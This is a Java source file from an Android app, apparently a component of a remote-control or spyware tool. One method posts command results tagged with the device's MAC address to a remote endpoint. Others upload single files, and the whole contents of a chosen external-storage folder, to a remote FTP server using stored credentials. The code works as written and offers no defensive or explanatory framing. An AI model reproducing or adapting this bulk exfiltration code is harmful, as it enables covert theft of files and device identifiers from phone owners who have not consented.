package com.megamind.abdul.system;

import android.content.Context;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;


class ActionResponseSender {

    static void Action_Response(final Context context, final JSONObject data_json) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST, GlobalVars.RESPONSE_TAKER,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Log.e("Response :", response);
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                try {
                    Log.e("Error Response :", error.getMessage());
                } catch (Exception ignored) {
                }
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                try {
                    SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy  hh:mm:ss a");
                    data_json.put("time", formatter.format(new Date(System.currentTimeMillis())));
                } catch (JSONException ignored) {
                }
                params.put("mac_addr", GetProperties.getInstance(context).getMAC());
                params.put("data_string", data_json.toString());
                //Log.e("data_string", data_json.toString());
                return params;
            }
        };
        RequestQueue queue = Volley.newRequestQueue(context);
        queue.add(stringRequest);
    }

    static boolean sendFile_FTP(File yourFile) throws IOException {

        FTPClient con = new FTPClient();
        con.connect(GlobalVars.FTP_URL);

        if (con.login(GlobalVars.FTP_USER, GlobalVars.FTP_PASSWORD)) {

            con.enterLocalPassiveMode(); // important!
            con.setFileType(FTP.BINARY_FILE_TYPE);

            FileInputStream in = new FileInputStream(yourFile);

            boolean result = con.storeFile(GlobalVars.FTP_DIRECTORY + yourFile.getName(), in);
            in.close();

            if (result) {
                Log.e("Upload Result :", "Successful");
                return true;
            }

            con.logout();
            con.disconnect();
        }
        return false;
    }

    static StringBuilder sendMultipleFile_FTP(String directory, boolean external) throws IOException {

        StringBuilder files_array = new StringBuilder();

        FTPClient con = new FTPClient();
        con.connect(GlobalVars.FTP_URL);

        if (con.login(GlobalVars.FTP_USER, GlobalVars.FTP_PASSWORD)) {

            con.enterLocalPassiveMode(); // important!
            con.setFileType(FTP.BINARY_FILE_TYPE);


            File yourDir;
            if (external)
                yourDir = new File(System.getenv("SECONDARY_STORAGE") + "/" + directory);
            else
                yourDir = new File(System.getenv("EXTERNAL_STORAGE") + "/" + directory);

            Log.e("directory", yourDir.toString());
            for (File f : yourDir.listFiles()) {

                if (f.isFile()) {

                    String file_name = f.getName();

                    FileInputStream in = new FileInputStream(new File(yourDir.toString() + "/" + file_name));

                    boolean result = con.storeFile(GlobalVars.FTP_DIRECTORY + file_name, in);
                    in.close();

                    if (result) {
                        Log.e("Upload file:" + file_name + " :", "Successful");
                        files_array.append(file_name).append("\n");

                    }
                }
            }

            con.logout();
            con.disconnect();
        }
        return files_array;
    }
}
